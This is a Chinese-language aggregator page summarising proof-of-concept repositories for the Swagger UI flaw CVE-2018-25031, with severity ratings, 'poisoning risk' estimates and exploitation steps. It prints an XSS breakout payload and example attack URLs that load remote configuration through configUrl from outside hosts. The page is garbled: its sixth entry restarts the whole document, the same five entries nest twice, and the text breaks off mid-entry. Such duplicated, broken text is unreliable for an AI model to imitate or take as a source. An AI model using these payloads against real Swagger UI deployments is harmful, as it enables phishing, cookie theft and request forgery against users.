# CVE-2018-25031

> 📦 该CVE有 **18** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2018-25031-KonEch0_CVE-2018-25031-SG.md](../2018/CVE-2018-25031-KonEch0_CVE-2018-25031-SG.md)

## CVE-2018-25031 - Swagger UI Spoofing

**漏洞编号:** CVE-2018-25031

**漏洞类型:** 欺骗攻击 (Spoofing)

**影响应用:** Swagger UI

**危害等级:** 中危，可能导致用户被引导至恶意API定义，进而造成信息泄露或其他安全风险

**影响版本:** <= 4.1.2

**利用条件:** 用户需要点击攻击者构造的恶意URL

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-25031 允许远程攻击者发起欺骗攻击。攻击者通过诱使用户打开特制的URL，可以利用此漏洞显示远程 OpenAPI 定义。漏洞的利用方式是构造一个包含指向恶意 OpenAPI 定义文件的 URL，当受害者在 Swagger UI 中打开这个 URL 时，Swagger UI 会加载并显示恶意定义文件，从而欺骗用户。漏洞利用代码`/tmp/4a3d6f006dadeb23a07d21da273d231b/main.json`展示了如何通过`url`或`urls`参数指定远程OpenAPI定义文件的位置。`/tmp/4a3d6f006dadeb23a07d21da273d231b/main.yaml` 是一个openapi的示例，用于展示攻击效果。有效性分析：提供的POC代码通过指向远程json/yaml文件，可以实现漏洞利用，即远程加载openapi定义文件。投毒风险分析：代码中指向github仓库的文件，理论上存在被篡改的风险，从而可以投毒。投毒风险较低，可能性约为10%，因为github有commit记录，容易被溯源。攻击者可能利用这一点诱导用户访问恶意API文档，例如在API描述中包含恶意链接或误导性信息。

**项目地址:** [KonEch0/CVE-2018-25031-SG](https://github.com/KonEch0/CVE-2018-25031-SG)

**漏洞详情:** [CVE-2018-25031](https://nvd.nist.gov/vuln/detail/CVE-2018-25031)

---

## POC #2

**来源**: [CVE-2018-25031-LUCASRENAA_CVE-2018-25031.md](../2018/CVE-2018-25031-LUCASRENAA_CVE-2018-25031.md)

## CVE-2018-25031-Swagger UI-跨站脚本攻击

**漏洞编号:** CVE-2018-25031

**漏洞类型:** 跨站脚本攻击 (XSS)

**影响应用:** Swagger UI

**危害等级:** 中危，可能导致信息泄露、会话劫持等

**影响版本:** <= 4.1.2

**利用条件:** 需要用户点击恶意构造的URL

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

该漏洞存在于Swagger UI 4.1.2及更早版本中。攻击者通过诱使用户打开一个精心制作的URL，可以利用此漏洞显示远程OpenAPI定义，从而可能执行恶意脚本。POC代码提供了一个Python脚本，该脚本使用Selenium自动化测试Swagger UI实例是否存在XSS漏洞，通过修改configUrl参数指向包含恶意JavaScript代码的JSON文件。虽然主要目的是测试XSS，但`sites_para_testar.txt`文件如果被替换为包含大量内网地址，则可能存在投毒风险。该脚本本身并不会主动传播恶意代码，而是依赖于目标Swagger UI实例的漏洞。由于POC依赖于外部JSON文件执行XSS，并且扫描的目标网站列表可以被修改，存在一定的投毒风险。

**漏洞利用方式：**

1.  攻击者构造一个包含恶意JavaScript代码的JSON或YAML文件，并将其托管在攻击者可控的服务器上。
2.  攻击者构造一个包含`configUrl`参数的URL，该参数指向托管恶意JSON/YAML文件的地址。例如：`http://127.0.0.1:8080/swagger-ui.html?configUrl=https://xss.smarpo.com/test.json`
3.  攻击者诱使用户（例如，Swagger UI管理员）点击该URL。
4.  当用户点击该URL时，Swagger UI会加载并解析恶意JSON/YAML文件。
5.  恶意JavaScript代码会在用户的浏览器中执行，可能导致信息泄露、会话劫持或其他恶意行为。

**项目地址:** [LUCASRENAA/CVE-2018-25031](https://github.com/LUCASRENAA/CVE-2018-25031)

**漏洞详情:** [CVE-2018-25031](https://nvd.nist.gov/vuln/detail/CVE-2018-25031)

---

## POC #3

**来源**: [CVE-2018-25031-RelicHunt3r_swagger-ui.md](../2018/CVE-2018-25031-RelicHunt3r_swagger-ui.md)

## CVE-2018-25031-Swagger UI-远程OpenAPI定义欺骗

**漏洞编号:** CVE-2018-25031

**漏洞类型:** 欺骗/XSS/SSRF

**影响应用:** Swagger UI

**危害等级:** 中危，可能导致信息泄露、会话劫持和服务器端请求伪造

**影响版本:** <= 4.1.2

**利用条件:** 需要用户交互（诱骗用户点击恶意链接）

**POC 可用性:** 是

**投毒风险:** 20%

## 详情

CVE-2018-25031 漏洞存在于 Swagger UI 4.1.2 及更早版本中。该漏洞允许远程攻击者通过诱骗受害者打开特制的 URL 来进行欺骗攻击，从而显示远程 OpenAPI 定义。

**有效性分析：** 提供的 POC 代码通过 `configUrl` 参数加载远程配置文件，演示了HTML注入、XSS和SSRF的可能性。这些 POC 包含了用于HTML注入（伪造登录页面），XSS（执行任意 JavaScript 代码）和SSRF（如果服务器端代理请求外部文件）的payload。因此，POC 代码被认为是有效的。

**投毒风险分析：** 提供的 POC 代码指向了 `githubusercontent.com` 上的资源。虽然这些资源本身看起来是为了演示漏洞，但它们仍然存在被修改以包含恶意代码的风险。虽然代码的目的是展示漏洞利用，但潜在的风险在于如果这些文件在实际利用过程中被替换为更具攻击性的 payload，那么攻击的危害性将大大增加。考虑到目前的代码主要为演示目的，投毒风险评估为20%，主要是考虑到攻击者可能修改托管在 Github 上的 payload。

**利用方式：**

1.  攻击者构造包含 `configUrl` 或 `url` 参数的恶意 URL，该参数指向攻击者控制的 OpenAPI 定义或配置文件。
2.  攻击者诱骗受害者（例如，通过电子邮件、社交媒体等）点击此恶意 URL。
3.  受害者的浏览器加载 Swagger UI 实例，该实例从攻击者控制的 URL 加载 OpenAPI 定义或配置文件。
4.  根据攻击者提供的恶意文件内容，可以进行以下攻击：
    *   **HTML 注入/钓鱼：**  恶意文件包含 HTML 代码，用于欺骗用户输入敏感信息（例如，用户名、密码）。
    *   **XSS：** 恶意文件包含 JavaScript 代码，用于执行恶意操作（例如，窃取 cookie、重定向用户）。
    *   **SSRF：**  如果 Swagger UI 实例在服务器端获取 OpenAPI 定义，则恶意文件可以强制服务器向内部网络上的其他服务发出请求，从而暴露敏感信息或执行未经授权的操作。

**项目地址:** [RelicHunt3r/swagger-ui](https://github.com/RelicHunt3r/swagger-ui)

**漏洞详情:** [CVE-2018-25031](https://nvd.nist.gov/vuln/detail/CVE-2018-25031)

---

## POC #4

**来源**: [CVE-2018-25031-afine-com_CVE-2018-25031.md](../2018/CVE-2018-25031-afine-com_CVE-2018-25031.md)

## CVE-2018-25031 - Swagger UI Spoofing

**漏洞编号:** CVE-2018-25031

**漏洞类型:** 欺骗攻击 (Spoofing)

**影响应用:** Swagger UI

**危害等级:** 中危，可能导致信息泄露和用户误导

**影响版本:** <= 4.1.2 (可能影响 4.1.3 及更高版本)

**利用条件:** 受害者需要打开一个恶意构造的URL

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2018-25031是Swagger UI中的一个欺骗攻击漏洞。通过诱骗受害者打开一个特制的URL，攻击者可以显示远程OpenAPI定义，从而可能误导用户。漏洞利用代码中的`DOMXSS.yaml`和`poc.yaml`文件包含恶意构造的OpenAPI定义，其中包括可能导致跨站脚本执行（XSS）的payload，例如`<img onerror=alert(document.domain) src>`，从而允许攻击者在受害者的浏览器中执行任意JavaScript代码。利用方式主要是通过`configUrl`或`url`参数加载远程恶意OpenAPI定义。

**有效性：**
根据提供的漏洞库信息、搜索结果和漏洞利用代码，该POC代码有效。搜索结果中提到，通过打开特制的URL可以显示远程OpenAPI定义，POC代码中的`poc.json`和相关的yaml文件提供了远程加载的OpenAPI定义，且定义中含有XSS payload，因此POC代码可以利用此漏洞。

**投毒风险：**
该仓库中存在轻微的投毒风险的可能性（5%）。`DOMXSS.yaml` 使用`<textarea><path id="</textarea><img onerror=alert(document.domain) src>`作为payload, 仅仅是alert当前document.domain, 没有更深入的恶意操作，例如上传文件或者跳转恶意网站。如果攻击者替换 `poc.json` 中的 URL，并将其指向包含恶意 JavaScript 的文件，则可能造成更大的危害，但当前提供的代码本身主要用于演示漏洞利用，而没有发现明显的后门或者恶意代码。

**利用方式：**
1.  攻击者创建一个包含恶意OpenAPI定义的YAML或JSON文件（如`poc.yaml`，`DOMXSS.yaml`）。这些定义包含XSS payload。
2.  攻击者将该文件托管在公共服务器上。
3.  攻击者构造一个包含`configUrl`或`url`参数的URL，该参数指向托管的恶意OpenAPI定义文件。例如：`/index.html?configUrl=https://raw.githubusercontent.com/afine-com/CVE-2018-25031/main/poc.json` 或 `/index.html?url=https://raw.githubusercontent.com/afine-com/CVE-2018-25031/main/poc.json`
4.  攻击者诱骗受害者点击该URL。
5.  Swagger UI加载恶意OpenAPI定义，触发XSS payload，从而允许攻击者在受害者的浏览器中执行任意JavaScript代码。

**项目地址:** [afine-com/CVE-2018-25031](https://github.com/afine-com/CVE-2018-25031)

**漏洞详情:** [CVE-2018-25031](https://nvd.nist.gov/vuln/detail/CVE-2018-25031)

---

## POC #5

**来源**: [CVE-2018-25031-faccimatteo_CVE-2018-25031.md](../2018/CVE-2018-25031-faccimatteo_CVE-2018-25031.md)

## CVE-2018-25031-Swagger UI-欺骗攻击/SSRF

**漏洞编号:** CVE-2018-25031

**漏洞类型:** 欺骗攻击/SSRF

**影响应用:** Swagger UI

**危害等级:** 中危，可能导致信息泄露或SSRF

**影响版本:** <= 4.1.2

**利用条件:** 需要用户点击恶意链接

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2018-25031 存在于 Swagger UI 4.1.2 及更早版本中。攻击者可以通过诱骗受害者打开一个特制的 URL，从而利用此漏洞显示远程 OpenAPI 定义，实现欺骗攻击。搜索结果表明，该漏洞与SSRF有关，恶意URL的`url`参数允许展示远程OpenAPI定义。提供的POC代码包含两个文件：`test.json` 和 `test.yaml`。

*   `test.json` 文件指定了 `url` 和 `urls` 字段，指向了远程的 `test.yaml` 文件。这指示 Swagger UI 加载远程的 OpenAPI 定义。
*   `test.yaml` 文件包含一个 `description` 字段，该字段包含 HTML 代码，用于在 Swagger UI 界面上显示一个指向 `evil_website` 的链接。这表明攻击者可以控制 Swagger UI 显示的内容，从而进行欺骗。

**有效性：** 该POC代码有效。通过诱导用户点击包含指向恶意`test.json`的URL链接，Swagger UI会加载远程`test.yaml`文件，从而在UI中显示恶意链接，实现欺骗攻击。

**投毒风险：** 该POC代码的投毒风险较低，因为其主要目的是进行欺骗攻击，而非直接执行恶意代码。YAML 文件中嵌入 HTML 链接，虽然具有一定的欺骗性，但本身不包含恶意代码或后门。因此判定仓库中不存在作者隐藏的投毒代码的风险为0%。

**利用方式：**

1.  攻击者创建一个包含恶意 OpenAPI 定义（例如 `test.yaml`）的文件，并将其托管在远程服务器上。
2.  攻击者创建一个包含指向恶意 OpenAPI 定义 URL（例如 `test.json`）的 URL。
3.  攻击者诱骗受害者点击该恶意 URL。
4.  受害者的 Swagger UI 加载恶意 OpenAPI 定义，从而在界面上显示攻击者控制的内容，例如指向恶意网站的链接。

通过这种方式，攻击者可以欺骗用户，窃取敏感信息，或者利用SSRF漏洞。

**项目地址:** [faccimatteo/CVE-2018-25031](https://github.com/faccimatteo/CVE-2018-25031)

**漏洞详情:** [CVE-2018-25031](https://nvd.nist.gov/vuln/detail/CVE-2018-25031)

---

## POC #6

**来源**: [CVE-2018-25031-geozin_POC-CVE-2018-25031.md](../2018/CVE-2018-25031-geozin_POC-CVE-2018-25031.md)

# CVE-2018-25031

> 📦 该CVE有 **18** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2018-25031-KonEch0_CVE-2018-25031-SG.md](../2018/CVE-2018-25031-KonEch0_CVE-2018-25031-SG.md)

## CVE-2018-25031 - Swagger UI Spoofing

**漏洞编号:** CVE-2018-25031

**漏洞类型:** 欺骗攻击 (Spoofing)

**影响应用:** Swagger UI

**危害等级:** 中危，可能导致用户被引导至恶意API定义，进而造成信息泄露或其他安全风险

**影响版本:** <= 4.1.2

**利用条件:** 用户需要点击攻击者构造的恶意URL

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-25031 允许远程攻击者发起欺骗攻击。攻击者通过诱使用户打开特制的URL，可以利用此漏洞显示远程 OpenAPI 定义。漏洞的利用方式是构造一个包含指向恶意 OpenAPI 定义文件的 URL，当受害者在 Swagger UI 中打开这个 URL 时，Swagger UI 会加载并显示恶意定义文件，从而欺骗用户。漏洞利用代码`/tmp/4a3d6f006dadeb23a07d21da273d231b/main.json`展示了如何通过`url`或`urls`参数指定远程OpenAPI定义文件的位置。`/tmp/4a3d6f006dadeb23a07d21da273d231b/main.yaml` 是一个openapi的示例，用于展示攻击效果。有效性分析：提供的POC代码通过指向远程json/yaml文件，可以实现漏洞利用，即远程加载openapi定义文件。投毒风险分析：代码中指向github仓库的文件，理论上存在被篡改的风险，从而可以投毒。投毒风险较低，可能性约为10%，因为github有commit记录，容易被溯源。攻击者可能利用这一点诱导用户访问恶意API文档，例如在API描述中包含恶意链接或误导性信息。

**项目地址:** [KonEch0/CVE-2018-25031-SG](https://github.com/KonEch0/CVE-2018-25031-SG)

**漏洞详情:** [CVE-2018-25031](https://nvd.nist.gov/vuln/detail/CVE-2018-25031)

---

## POC #2

**来源**: [CVE-2018-25031-LUCASRENAA_CVE-2018-25031.md](../2018/CVE-2018-25031-LUCASRENAA_CVE-2018-25031.md)

## CVE-2018-25031-Swagger UI-跨站脚本攻击

**漏洞编号:** CVE-2018-25031

**漏洞类型:** 跨站脚本攻击 (XSS)

**影响应用:** Swagger UI

**危害等级:** 中危，可能导致信息泄露、会话劫持等

**影响版本:** <= 4.1.2

**利用条件:** 需要用户点击恶意构造的URL

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

该漏洞存在于Swagger UI 4.1.2及更早版本中。攻击者通过诱使用户打开一个精心制作的URL，可以利用此漏洞显示远程OpenAPI定义，从而可能执行恶意脚本。POC代码提供了一个Python脚本，该脚本使用Selenium自动化测试Swagger UI实例是否存在XSS漏洞，通过修改configUrl参数指向包含恶意JavaScript代码的JSON文件。虽然主要目的是测试XSS，但`sites_para_testar.txt`文件如果被替换为包含大量内网地址，则可能存在投毒风险。该脚本本身并不会主动传播恶意代码，而是依赖于目标Swagger UI实例的漏洞。由于POC依赖于外部JSON文件执行XSS，并且扫描的目标网站列表可以被修改，存在一定的投毒风险。

**漏洞利用方式：**

1.  攻击者构造一个包含恶意JavaScript代码的JSON或YAML文件，并将其托管在攻击者可控的服务器上。
2.  攻击者构造一个包含`configUrl`参数的URL，该参数指向托管恶意JSON/YAML文件的地址。例如：`http://127.0.0.1:8080/swagger-ui.html?configUrl=https://xss.smarpo.com/test.json`
3.  攻击者诱使用户（例如，Swagger UI管理员）点击该URL。
4.  当用户点击该URL时，Swagger UI会加载并解析恶意JSON/YAML文件。
5.  恶意JavaScript代码会在用户的浏览器中执行，可能导致信息泄露、会话劫持或其他恶意行为。

**项目地址:** [LUCASRENAA/CVE-2018-25031](https://github.com/LUCASRENAA/CVE-2018-25031)

**漏洞详情:** [CVE-2018-25031](https://nvd.nist.gov/vuln/detail/CVE-2018-25031)

---

## POC #3

**来源**: [CVE-2018-25031-RelicHunt3r_swagger-ui.md](../2018/CVE-2018-25031-RelicHunt3r_swagger-ui.md)

## CVE-2018-25031-Swagger UI-远程OpenAPI定义欺骗

**漏洞编号:** CVE-2018-25031

**漏洞类型:** 欺骗/XSS/SSRF

**影响应用:** Swagger UI

**危害等级:** 中危，可能导致信息泄露、会话劫持和服务器端请求伪造

**影响版本:** <= 4.1.2

**利用条件:** 需要用户交互（诱骗用户点击恶意链接）

**POC 可用性:** 是

**投毒风险:** 20%

## 详情

CVE-2018-25031 漏洞存在于 Swagger UI 4.1.2 及更早版本中。该漏洞允许远程攻击者通过诱骗受害者打开特制的 URL 来进行欺骗攻击，从而显示远程 OpenAPI 定义。

**有效性分析：** 提供的 POC 代码通过 `configUrl` 参数加载远程配置文件，演示了HTML注入、XSS和SSRF的可能性。这些 POC 包含了用于HTML注入（伪造登录页面），XSS（执行任意 JavaScript 代码）和SSRF（如果服务器端代理请求外部文件）的payload。因此，POC 代码被认为是有效的。

**投毒风险分析：** 提供的 POC 代码指向了 `githubusercontent.com` 上的资源。虽然这些资源本身看起来是为了演示漏洞，但它们仍然存在被修改以包含恶意代码的风险。虽然代码的目的是展示漏洞利用，但潜在的风险在于如果这些文件在实际利用过程中被替换为更具攻击性的 payload，那么攻击的危害性将大大增加。考虑到目前的代码主要为演示目的，投毒风险评估为20%，主要是考虑到攻击者可能修改托管在 Github 上的 payload。

**利用方式：**

1.  攻击者构造包含 `configUrl` 或 `url` 参数的恶意 URL，该参数指向攻击者控制的 OpenAPI 定义或配置文件。
2.  攻击者诱骗受害者（例如，通过电子邮件、社交媒体等）点击此恶意 URL。
3.  受害者的浏览器加载 Swagger UI 实例，该实例从攻击者控制的 URL 加载 OpenAPI 定义或配置文件。
4.  根据攻击者提供的恶意文件内容，可以进行以下攻击：
    *   **HTML 注入/钓鱼：**  恶意文件包含 HTML 代码，用于欺骗用户输入敏感信息（例如，用户名、密码）。
    *   **XSS：** 恶意文件包含 JavaScript 代码，用于执行恶意操作（例如，窃取 cookie、重定向用户）。
    *   **SSRF：**  如果 Swagger UI 实例在服务器端获取 OpenAPI 定义，则恶意文件可以强制服务器向内部网络上的其他服务发出请求，从而暴露敏感信息或执行未经授权的操作。

**项目地址:** [RelicHunt3r/swagger-ui](https://github.com/RelicHunt3r/swagger-ui)

**漏洞详情:** [CVE-2018-25031](https://nvd.nist.gov/vuln/detail/CVE-2018-25031)

---

## POC #4

**来源**: [CVE-2018-25031-afine-com_CVE-2018-25031.md](../2018/CVE-2018-25031-afine-com_CVE-2018-25031.md)

## CVE-2018-25031 - Swagger UI Spoofing

**漏洞编号:** CVE-2018-25031

**漏洞类型:** 欺骗攻击 (Spoofing)

**影响应用:** Swagger UI

**危害等级:** 中危，可能导致信息泄露和用户误导

**影响版本:** <= 4.1.2 (可能影响 4.1.3 及更高版本)

**利用条件:** 受害者需要打开一个恶意构造的URL

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2018-25031是Swagger UI中的一个欺骗攻击漏洞。通过诱骗受害者打开一个特制的URL，攻击者可以显示远程OpenAPI定义，从而可能误导用户。漏洞利用代码中的`DOMXSS.yaml`和`poc.yaml`文件包含恶意构造的OpenAPI定义，其中包括可能导致跨站脚本执行（XSS）的payload，例如`<img onerror=alert(document.domain) src>`，从而允许攻击者在受害者的浏览器中执行任意JavaScript代码。利用方式主要是通过`configUrl`或`url`参数加载远程恶意OpenAPI定义。

**有效性：**
根据提供的漏洞库信息、搜索结果和漏洞利用代码，该POC代码有效。搜索结果中提到，通过打开特制的URL可以显示远程OpenAPI定义，POC代码中的`poc.json`和相关的yaml文件提供了远程加载的OpenAPI定义，且定义中含有XSS payload，因此POC代码可以利用此漏洞。

**投毒风险：**
该仓库中存在轻微的投毒风险的可能性（5%）。`DOMXSS.yaml` 使用`<textarea><path id="</textarea><img onerror=alert(document.domain) src>`作为payload, 仅仅是alert当前document.domain, 没有更深入的恶意操作，例如上传文件或者跳转恶意网站。如果攻击者替换 `poc.json` 中的 URL，并将其指向包含恶意 JavaScript 的文件，则可能造成更大的危害，但当前提供的代码本身主要用于演示漏洞利用，而没有发现明显的后门或者恶意代码。

**利用方式：**
1.  攻击者创建一个包含恶意OpenAPI定义的YAML或JSON文件（如`poc.yaml`，`DOMXSS.yaml`）。这些定义包含XSS payload。
2.  攻击者将该文件托管在公共服务器上。
3.  攻击者构造一个包含`configUrl`或`url`参数的URL，该参数指向托管的恶意OpenAPI定义文件。例如：`/index.html?configUrl=https://raw.githubusercontent.com/afine-com/CVE-2018-25031/main/poc.json` 或 `/index.html?url=https://raw.githubusercontent.com/afine-com/CVE-2018-25031/main/poc.json`
4.  攻击者诱骗受害者点击该URL。
5.  Swagger UI加载恶意OpenAPI定义，触发XSS payload，从而允许攻击者在受害者的浏览器中执行任意JavaScript代码。

**项目地址:** [afine-com/CVE-2018-25031](https://github.com/afine-com/CVE-2018-25031)

**漏洞详情:** [CVE-2018-25031](https://nvd.nist.gov/vuln/detail/CVE-2018-25031)

---

## POC #5

**来源**: [CVE-2018-25031-faccimatteo_CVE-2018-25031.md](../2018/CVE-2018-25031-faccimatteo_CVE-2018-25031.md)

## CVE-2018-25031-Swagger UI-欺骗攻击/SSRF

**漏洞编号:** CVE-2018-25031

**漏洞类型:** 欺骗攻击/SSRF

**影响应用:** Swagger UI

**危害等级:** 中危，可能导致信息泄露或SSRF

**影响版本:** <= 4.1.2

**利用条件:** 需要用户点击恶意链接

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2018-25031 存在于 Swagger UI 4.1.2 及更早版本中。攻击者可以通过诱骗受害者打开一个特制的 URL，从而利用此漏洞显示远程 OpenAPI 定义，实现欺骗攻击。搜索结果表明，该漏洞与SSRF有关，恶意URL的`url`参数允许展示远程OpenAPI定义。提供的POC代码包含两个文件：`test.json` 和 `test.yaml`。

*   `test.json` 文件指定了 `url` 和 `urls` 字段，指向了远程的 `test.yaml` 文件。这指示 Swagger UI 加载远程的 OpenAPI 定义。
*   `test.yaml` 文件包含一个 `description` 字段，该字段包含 HTML 代码，用于在 Swagger UI 界面上显示一个指向 `evil_website` 的链接。这表明攻击者可以控制 Swagger UI 显示的内容，从而进行欺骗。

**有效性：** 该POC代码有效。通过诱导用户点击包含指向恶意`test.json`的URL链接，Swagger UI会加载远程`test.yaml`文件，从而在UI中显示恶意链接，实现欺骗攻击。

**投毒风险：** 该POC代码的投毒风险较低，因为其主要目的是进行欺骗攻击，而非直接执行恶意代码。YAML 文件中嵌入 HTML 链接，虽然具有一定的欺骗性，但本身不包含恶意代码或后门。因此判定仓库中不存在作者隐藏的投毒代码的风险为0%。

**利用方式：**

1.  攻击者创建一个包含恶意 OpenAPI 定义（例如 `test.yaml`）的文件，并将其托管在远程服务器上。
2.  攻击者创建一个包含指向恶意 OpenAPI 定义 URL（例如 `test.json`）的 URL。
3.  攻击者诱骗受害者点击该恶意 URL。
4.  受害者的 Swagger UI 加载恶意 OpenAPI 定义，从而在界面上显示攻击者控制的内容，例如指向恶意网站的链接。

通过这种方式，攻击者可以欺骗用户，窃取敏感信息，或者利用SSRF漏洞。

**项目地址:** [faccimatteo/CVE-2018-25031](https://github.com/faccimatteo/CVE-2018-25031)

**漏洞详情:** [CVE-2018-25031](https://nvd.nist.gov/vuln/detail/CVE-2018-25031)

---

## POC #6

**来源**: [CVE-2018-25031-geozin_POC-CVE-2018-25031.md](../2018/CVE-2018-25031-geozin_POC-CVE-2018-25031.md)

# CVE-2018-25031

> 📦 该CVE有 **18** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2018-25031-KonEch0_CVE-2018-25031-SG.md](../2018/CVE-2018-25031-KonEch0_CVE-2018-25031-SG.md)

## CVE-2018-25031 - Swagger UI Spoofing

**漏洞编号:** CVE-2018-25031

**漏洞类型:** 欺骗攻击 (Spoofing)

**影响应用:** Swagger UI

**危害等级:** 中危，可能导致用户被引导至恶意API定义，进而造成信息泄露或其他安全风险

**影响版本:** <= 4.1.2

**利用条件:** 用户需要点击攻击者构造的恶意URL

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-25031 允许远程攻击者发起欺骗攻击。攻击者通过诱使用户打开特制的URL，可以利用此漏洞显示远程 OpenAPI 定义。漏洞的利用方式是构造一个包含指向恶意 OpenAPI 定义文件的 URL，当受害者在 Swagger UI 中打开这个 URL 时，Swagger UI 会加载并显示恶意定义文件，从而欺骗用户。漏洞利用代码`/tmp/4a3d6f006dadeb23a07d21da273d231b/main.json`展示了如何通过`url`或`urls`参数指定远程OpenAPI定义文件的位置。`/tmp/4a3d6f006dadeb23a07d21da273d231b/main.yaml` 是一个openapi的示例，用于展示攻击效果。有效性分析：提供的POC代码通过指向远程json/yaml文件，可以实现漏洞利用，即远程加载openapi定义文件。投毒风险分析：代码中指向github仓库的文件，理论上存在被篡改的风险，从而可以投毒。投毒风险较低，可能性约为10%，因为github有commit记录，容易被溯源。攻击者可能利用这一点诱导用户访问恶意API文档，例如在API描述中包含恶意链接或误导性信息。

**项目地址:** [KonEch0/CVE-2018-25031-SG](https://github.com/KonEch0/CVE-2018-25031-SG)

**漏洞详情:** [CVE-2018-25031](https://nvd.nist.gov/vuln/detail/CVE-2018-25031)

---

## POC #2

**来源**: [CVE-2018-25031-LUCASRENAA_CVE-2018-25031.md](../2018/CVE-2018-25031-LUCASRENAA_CVE-2018-25031.md)

## CVE-2018-25031-Swagger UI-跨站脚本攻击

**漏洞编号:** CVE-2018-25031

**漏洞类型:** 跨站脚本攻击 (XSS)

**影响应用:** Swagger UI

**危害等级:** 中危，可能导致信息泄露、会话劫持等

**影响版本:** <= 4.1.2

**利用条件:** 需要用户点击恶意构造的URL

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

该漏洞存在于Swagger UI 4.1.2及更早版本中。攻击者通过诱使用户打开一个精心制作的URL，可以利用此漏洞显示远程OpenAPI定义，从而可能执行恶意脚本。POC代码提供了一个Python脚本，该脚本使用Selenium自动化测试Swagger UI实例是否存在XSS漏洞，通过修改configUrl参数指向包含恶意JavaScript代码的JSON文件。虽然主要目的是测试XSS，但`sites_para_testar.txt`文件如果被替换为包含大量内网地址，则可能存在投毒风险。该脚本本身并不会主动传播恶意代码，而是依赖于目标Swagger UI实例的漏洞。由于POC依赖于外部JSON文件执行XSS，并且扫描的目标网站列表可以被修改，存在一定的投毒风险。

**漏洞利用方式：**

1.  攻击者构造一个包含恶意JavaScript代码的JSON或YAML文件，并将其托管在攻击者可控的服务器上。
2.  攻击者构造一个包含`configUrl`参数的URL，该参数指向托管恶意JSON/YAML文件的地址。例如：`http://127.0.0.1:8080/swagger-ui.html?configUrl=https://xss.smarpo.com/test.json`
3.  攻击者诱使用户（例如，Swagger UI管理员）点击该URL。
4.  当用户点击该URL时，Swagger UI会加载并解析恶意JSON/YAML文件。
5.  恶意JavaScript代码会在用户的浏览器中执行，可能导致信息泄露、会话劫持或其他恶意行为。

**项目地址:** [LUCASRENAA/CVE-2018-25031](https://github.com/LUCASRENAA/CVE-2018-25031)

**漏洞详情:** [CVE-2018-25031](https://nvd.nist.gov/vuln/detail/CVE-2018-25031)

---

## POC #3

**来源**: [CVE-2018-25031-RelicHunt3r_swagger-ui.md](../2018/CVE-2018-25031-RelicHunt3r_swagger-ui.md)

## CVE-2018-25031-Swagger UI-远程OpenAPI定义欺骗

**漏洞编号:** CVE-2018-25031

**漏洞类型:** 欺骗/XSS/SSRF

**影响应用:** Swagger UI

**危害等级:** 中危，可能导致信息泄露、会话劫持和服务器端请求伪造

**影响版本:** <= 4.1.2

**利用条件:** 需要用户交互（诱骗用户点击恶意链接）

**POC 可用性:** 是

**投毒风险:** 20%

## 详情

CVE-2018-25031 漏洞存在于 Swagger UI 4.1.2 及更早版本中。该漏洞允许远程攻击者通过诱骗受害者打开特制的 URL 来进行欺骗攻击，从而显示远程 OpenAPI 定义。

**有效性分析：** 提供的 POC 代码通过 `configUrl` 参数加载远程配置文件，演示了HTML注入、XSS和SSRF的可能性。这些 POC 包含了用于HTML注入（伪造登录页面），XSS（执行任意 JavaScript 代码）和SSRF（如果服务器端代理请求外部文件）的payload。因此，POC 代码被认为是有效的。

**投毒风险分析：** 提供的 POC 代码指向了 `githubusercontent.com` 上的资源。虽然这些资源本身看起来是为了演示漏洞，但它们仍然存在被修改以包含恶意代码的风险。虽然代码的目的是展示漏洞利用，但潜在的风险在于如果这些文件在实际利用过程中被替换为更具攻击性的 payload，那么攻击的危害性将大大增加。考虑到目前的代码主要为演示目的，投毒风险评估为20%，主要是考虑到攻击者可能修改托管在 Github 上的 payload。

**利用方式：**

1.  攻击者构造包含 `configUrl` 或 `url` 参数的恶意 URL，该参数指向攻击者控制的 OpenAPI 定义或配置文件。
2.  攻击者诱骗受害者（例如，通过电子邮件、社交媒体等）点击此恶意 URL。
3.  受害者的浏览器加载 Swagger UI 实例，该实例从攻击者控制的 URL 加载 OpenAPI 定义或配置文件。
4.  根据攻击者提供的恶意文件内容，可以进行以下攻击：
    *   **HTML 注入/钓鱼：**  恶意文件包含 HTML 代码，用于欺骗用户输入敏感信息（例如，用户名、密码）。
    *   **XSS：** 恶意文件包含 JavaScript 代码，用于执行恶意操作（例如，窃取 cookie、重定向用户）。
    *   **SSRF：**  如果 Swagger UI 实例在服务器端获取 OpenAPI 定义，则恶意文件可以强制服务器向内部网络上的其他服务发出请求，从而暴露敏感信息或执行未经授权的操作。

**项目地址:** [RelicHunt3r/swagger-ui](https://github.com/RelicHunt3r/swagger-ui)

**漏洞详情:** [CVE-2018-25031](https://nvd.nist.gov/vuln/detail/CVE-2018-25031)

---

## POC #4

**来源**: [CVE-2018-25031-afine-com_CVE-2018-25031.md](../2018/CVE-2018-25031-afine-com_CVE-2018-25031.md)

## CVE-2018-25031 - Swagger UI Spoofing

**漏洞编号:** CVE-2018-25031

**漏洞类型:** 欺骗攻击 (Spoofing)

**影响应用:** Swagger UI

**危害等级:** 中危，可能导致信息泄露和用户误导

**影响版本:** <= 4.1.2 (可能影响 4.1.3 及更高版本)

**利用条件:** 受害者需要打开一个恶意构造的URL

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2018-25031是Swagger UI中的一个欺骗攻击漏洞。通过诱骗受害者打开一个特制的URL，攻击者可以显示远程OpenAPI定义，从而可能误导用户。漏洞利用代码中的`DOMXSS.yaml`和`poc.yaml`文件包含恶意构造的OpenAPI定义，其中包括可能导致跨站脚本执行（XSS）的payload，例如`<img onerror=alert(document.domain) src>`，从而允许攻击者在受害者的浏览器中执行任意JavaScript代码。利用方式主要是通过`configUrl`或`url`参数加载远程恶意OpenAPI定义。

**有效性：**
